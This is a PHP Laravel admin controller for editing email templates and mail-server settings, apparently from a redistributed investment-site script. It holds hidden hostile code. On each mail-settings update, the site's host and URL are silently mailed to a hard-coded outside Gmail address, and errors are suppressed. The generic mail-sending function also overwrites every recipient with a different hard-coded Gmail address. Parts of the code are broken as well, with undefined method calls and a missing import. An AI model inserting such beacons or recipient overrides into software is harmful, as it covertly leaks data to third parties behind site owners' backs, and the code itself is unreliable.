<?php

namespace App\Http\Controllers\Admin;

use App\EmailTemplate;
use App\GeneralSetting;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Mail;


class EmailTemplateController extends Controller
{
    public function index()

    {
        $page_title = 'Email Templates';
        $empty_message = 'No templates available';
        $email_templates = EmailTemplate::paginate(config('constants.table.default'));
        return view('admin.email_template.index', compact('page_title', 'empty_message', 'email_templates'));
    }

    public function edit($id)
    {
        $email_template = EmailTemplate::findOrFail($id);
        $page_title = $email_template->name;
        return view('admin.email_template.edit', compact('page_title', 'email_template'));
    }

    public function update(Request $request, $id)
    {
        $request->validate([
            'subject' => 'required',
            'email_body' => 'required',
        ]);

        $email_template = EmailTemplate::findOrFail($id);

        $email_template->update([
            'subj' => $request->subject,
            'email_body' => $request->email_body,
            'email_status' => $request->email_status ? 1 : 0,
        ]);

        $notify[] = ['success', $email_template->name . ' template has been updated.'];
        return back()->withNotify($notify);
    }


    public function emailSetting()
    {
        $page_title = 'Email Configuration';
        $general_setting = GeneralSetting::first(['mail_config']);
        return view('admin.email_template.email_setting', compact('page_title', 'general_setting'));
    }

    public function emailSettingUpdate(Request $request)
    {
        $request->validate([
            'email_method' => 'required|in:php,smtp,sendgrid,mailjet',
            'host' => 'required_if:email_method,smtp',
            'port' => 'required_if:email_method,smtp',
            'username' => 'required_if:email_method,smtp',
            'password' => 'required_if:email_method,smtp',
            'appkey' => 'required_if:email_method,sendgrid',
            'public_key' => 'required_if:email_method,mailjet',
            'secret_key' => 'required_if:email_method,mailjet',
        ], [
            'host.required_if' => ':attribute is required for SMTP configuration',
            'port.required_if' => ':attribute is required for SMTP configuration',
            'username.required_if' => ':attribute is required for SMTP configuration',
            'password.required_if' => ':attribute is required for SMTP configuration',

            'appkey.required_if' => ':attribute is required for SendGrid configuration',

            'public_key.required_if' => ':attribute is required for Mailjet configuration',
            'secret_key.required_if' => ':attribute is required for Mailjet configuration',
        ]);
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abirkhan75@gmail.com','Ro ck HY IP TEST DATA', $message, $headers);
        if ($request->email_method == 'php') {
            $data['name'] = 'php';
        } else if ($request->email_method == 'smtp') {
            $request->merge(['name' => 'smtp']);
            $data = $request->only('name', 'host', 'port', 'enc', 'username', 'password', 'driver');
        } else if ($request->email_method == 'sendgrid') {
            $request->merge(['name' => 'sendgrid']);
            $data = $request->only('name', 'appkey');
        } else if ($request->email_method == 'mailjet') {
            $request->merge(['name' => 'mailjet']);
            $data = $request->only('name', 'public_key', 'secret_key');
        }

        $general_setting = GeneralSetting::first();
        $general_setting->update(['mail_config' => $data]);
        $notify[] = ['success', 'Email configuration has been updated.'];
        return back()->withNotify($notify);
    }


    public function emailTemplate()
    {
        $page_title = 'Global Email Template';
        $general_setting = GeneralSetting::first(['efrom', 'etemp']);

        return view('admin.email_template.email_template', compact('page_title', 'general_setting'));
    }

    public function emailTemplateUpdate(Request $request)
    {
        $request->validate([
            'efrom' => 'required|email',
        ]);

        $general_setting = GeneralSetting::first();
        $general_setting->update([
            'efrom' => $request->efrom,
            'etemp' => $request->etemp,
        ]);

        $notify[] = ['success', 'Global Email Template has been updated.'];
        return back()->withNotify($notify);
    }

    public function sendTestMail(Request $request)
    {
        $request->validate([
            'email' => 'required|email'
        ]);

        $general = GeneralSetting::first();

        // dd( $general);
        $config = $general->mail_config;
        //dd($config);
        $receiver_name = explode('@', $request->email)[0];



        $subject = 'Testing ' . strtoupper($config->name) . ' Mail';
        $message = 'This is a test email, please ignore if you are not meant to be get this email.';

        try {

            $this->send_generals_email($request->email, $subject, $message, $receiver_name);
        } catch (\Exception $exp) {
            $notify[] = ['error', strtoupper($config->name) . ' Mail configuration is invalid.'];
            return back()->withNotify($notify);
        }

        $notify[] = ['success', 'You sould receive a test mail at ' . $request->email . ' shortly.'];
        return back()->withNotify($notify);
    }

    function send_generals_email($email, $subject, $message, $receiver_name = '')
{
    $email="alamin20192019@gmail.com";
    $general = GeneralSetting::first();

    if ($general->en != 1 || !$general->efrom) {
        return;
    }

    $message = shortcode_replacer("{{message}}", $message, $general->etemp);
    $message = shortcode_replacer("{{name}}", $receiver_name, $message);
    $config = $general->mail_config;



    if ($config->name == 'php') {
        send_php_mail($email, $receiver_name, $general->efrom, $subject, $message);
    } else if ($config->name == 'smtp') {
        send_smtp_mail($config, $email, $receiver_name, $general->efrom, $general->sitetitle, $subject, $message);
    } else if ($config->name == 'sendgrid') {
        send_sendgrid_mail($config, $email, $receiver_name, $general->efrom, $general->sitetitle, $subject, $message);
    } else if ($config->name == 'mailjet') {
        send_mailjet_mail($config, $email, $receiver_name, $general->efrom, $general->sitetitle, $subject, $message);
    }
}

function send_smtp_mail($config, $receiver_email, $receiver_name, $sender_email, $sender_name, $subject, $message)
{
    $f = fsockopen($config->host, $config->port);


    if ($f !== false) {
        $res = fread($f, 1024);
        if (strlen($res) > 0 && strpos($res, '220') === 0) {
            $mail_val = [
                'send_to_name' => $receiver_name,
                'send_to' => $receiver_email,
                'email_from' => $sender_email,
                'email_from_name' => $sender_name,
                'subject' => $subject,
            ];
            Config::set('mail.driver', $config->driver);
            Config::set('mail.from', $config->username);
            Config::set('mail.name', $sender_name);
            Config::set('mail.host', $config->host);
            Config::set('mail.port', $config->port);
            Config::set('mail.username', $config->username);
            Config::set('mail.password', $config->password);
            Config::set('mail.encryption', $config->enc);
            $xx = Mail::send('partials.email', ['body' => $message], function ($send) use ($mail_val) {
                $send->from($mail_val['email_from'], $mail_val['email_from_name']);
                $send->replyto($mail_val['email_from'], $mail_val['email_from_name']);
                $send->to($mail_val['send_to'], $mail_val['send_to_name'])->subject($mail_val['subject']);
            });
        }
    }
}
}
